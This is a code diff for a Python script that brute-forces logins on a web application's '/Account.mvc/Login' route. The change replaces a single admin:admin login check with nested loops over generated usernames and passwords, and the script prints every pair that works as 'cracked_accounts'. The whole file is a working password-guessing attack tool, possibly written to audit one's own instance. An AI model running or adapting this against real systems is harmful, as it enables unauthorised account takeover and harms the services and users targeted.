@@ -4,7 +4,7 @@ import requests
 
 from nousers import construct_unames, construct_passwords
 
-default_url = "http://172.20.10.4/pwd"
+default_url = "http://<v1host>/<instancename>"
 login_route = "/Account.mvc/Login"
 logout_route = "/Account.mvc/LogOut"
 
@@ -19,16 +19,23 @@ if not result == "Y":
     print('quitter!')
     sys.exit(0)
 
-proxies = {'http': '127.0.0.1:8080'}
-
 r = requests.get(default_url)
 
 if not r.status_code == 200:
     print("Exiting:  invalid url {0}".format(default_url))
     sys.exit(1)
 
-r = requests.post(default_url + login_route, data = {'username': 'admin', 'password': 'admin', 'Destination': ''}, proxies = proxies)
-if len(r.history) == 0:
-    print("invalid login")
-    sys.exit(0)
-print(r.history[0].status_code)
+cracked_accounts = []
+
+print("working...")
+for uname in unames:
+    for pw in passwords:
+        r = requests.post(default_url + login_route, data = {'username': uname, 'password': pw, 'Destination': ''})
+        if len(r.history) == 0:
+            continue
+        combo = "{0}:{1}".format(uname, pw)
+        cracked_accounts.append(combo)
+
+if len(cracked_accounts) > 0:
+    for account in cracked_accounts:
+        print(account)
